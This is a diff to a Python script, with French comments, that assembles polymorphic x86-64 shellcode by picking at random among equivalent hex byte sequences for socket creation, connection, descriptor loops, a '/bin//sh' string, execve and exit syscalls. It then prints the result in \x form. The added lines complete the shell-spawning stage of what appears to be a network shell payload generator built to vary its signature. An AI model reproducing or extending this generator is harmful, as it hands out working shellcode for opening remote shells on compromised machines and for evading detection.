@@ -192,11 +192,15 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 list_const_loop = ["7df4"]
 list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
 list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
+list_loopconstante = ["B0210F0548ffce7df4"]
 list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
 list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
+list_stackconst = ["50534889E750574889E6"]
 list_execve = ["B03B", "B03A0401"]
+list_constcallsys = ["0f05"]
 list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]
+list_lastcallsys = ["0f05"]
 
 
 shellcode += random.choice(create_socket_1)
@@ -222,6 +226,17 @@ shellcode += random.choice(connexion_socket_11)
 shellcode += random.choice(connexion_socket_12)
 shellcode += random.choice(list_const_loop)
 shellcode += random.choice(list_xorloop)
+shellcode += random.choice(list_loop)
+shellcode += random.choice(list_loopconstante)
+shellcode += random.choice(list_loop)
+shellcode += random.choice(list_xor)
+shellcode += random.choice(list_binbash)
+shellcode += random.choice(list_stackconst)
+shellcode += random.choice(list_execve)
+shellcode += random.choice(list_constcallsys)
+shellcode += random.choice(list_exit)
+shellcode += random.choice(list_xorsyscall)
+shellcode += random.choice(list_lastcallsys)
 
 
 # Fonction qui permet l'ajout des /xFF/
@@ -230,6 +245,9 @@ def shellcodize(s):
     shellcode = 'X'
     shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
     shellcode = shellcode.replace('X', '\\x')
+    print("Shellcode :")
     print(shellcode)
 
+
 shellcodize(shellcode)
+print(len(shellcode))
